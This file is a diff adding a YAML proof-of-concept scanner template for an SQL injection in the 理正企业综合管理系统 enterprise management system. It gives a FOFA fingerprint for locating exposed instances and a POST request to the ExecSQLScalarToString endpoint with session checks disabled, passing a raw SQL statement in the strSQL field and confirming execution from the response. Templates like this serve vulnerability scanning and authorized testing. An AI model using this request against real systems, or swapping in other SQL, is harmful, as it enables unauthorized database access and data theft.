@@ -1,0 +1,22 @@
+id: poc-yaml-lzmis-execsqlscalartostring-sqli
+info:
+  name: 理正企业综合管理系统 ExecSQLScalarToString SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 理正企业综合管理系统
+  fofa: body="LZSystem"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"LZSystem")
+- method: POST
+  path: /ajax/LeadingMIS.CustomExp.AjaxExp,LeadingMIS.CustomExp.ashx?_method=ExecSQLScalarToString&_session=no
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: strSQL=select sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))
+  expression: status_code == 200 && contains(body,"0x" + t2) && !contains(body,"<")
+transport: http
